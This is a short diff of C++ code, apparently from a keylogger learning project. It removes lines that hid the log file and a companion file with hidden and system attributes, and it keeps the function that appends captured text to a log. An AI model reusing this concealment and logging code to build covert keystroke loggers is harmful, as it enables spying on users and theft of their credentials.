@@ -8,17 +8,9 @@ unsigned int sc;
 
 void writeToLog(std::string s) //write a string to the log
 {
-	static char namefile[] = "E:\\learning\\courses\\logger2\\Debug\\inf.txt";
-	SetFileAttributes(LPCWSTR(namefile), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-	std::ofstream logg(namefile, std::ios::app); //opens log file
-	logg << logName;
-	logg.close();
-
-	SetFileAttributes(LPCWSTR(logName), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 	std::ofstream log(logName, std::ios::app); //opens log file
 	log << s; //writes to log.. with format '['']'
 	log.close(); //closes log
-				 //  openFile = false;
 }
 BOOL isCaps()
 {
